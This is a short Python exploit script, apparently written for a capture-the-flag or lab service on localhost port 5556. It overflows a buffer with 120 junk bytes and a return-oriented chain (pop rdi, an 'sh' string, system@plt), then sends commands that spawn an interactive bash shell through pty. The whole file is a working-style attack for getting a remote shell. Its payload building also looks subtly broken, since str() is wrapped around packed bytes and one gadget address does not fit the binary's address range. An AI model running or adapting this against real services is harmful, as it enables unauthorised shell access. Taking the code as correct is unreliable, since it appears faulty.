from struct import pack
from telnetlib import Telnet
"""
Be careful with telnet. It doubles the '\xff' when sending payload. Use socket instead. And set that for telnet to interact.
p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect((ip,port))
p.send(__)
p.recv(__)
tn=Telnet()
tn.sock=p
tn.interact()
"""
p64 = lambda x: pack("Q",x)              #convert to little endian
print("[*] Connecting to server !!")
p=Telnet('127.0.0.1',5556)          #connect to server
print("[*] Connected.")
pop_rdi=0x1228fa                        #address to pop rdi;ret
system_plt=0x401040                     #address to system@plt entry
sh=0x402051                              #address of 'sh' string

print(p.read_until(bytes(">", 'utf-8')))                 #start reading

buf = "A"*120                            #junk
buf+=str(p64(pop_rdi))                        #pop rdi;ret
buf+=str(p64(sh))                             # 'sh' goes into rdi
buf+=str(p64(system_plt))                     # system

print("[*] Sending payload ..")
print(buf)
p.write(bytes(buf+'\n', 'utf-8'))                        #send payload
print ("[*] Got shell. Enter commands.")
p.write(bytes('id;python -c "import pty;pty.spawn(\'/bin/bash\')"\n', 'utf-8'))    #just initial commands
p.interact()  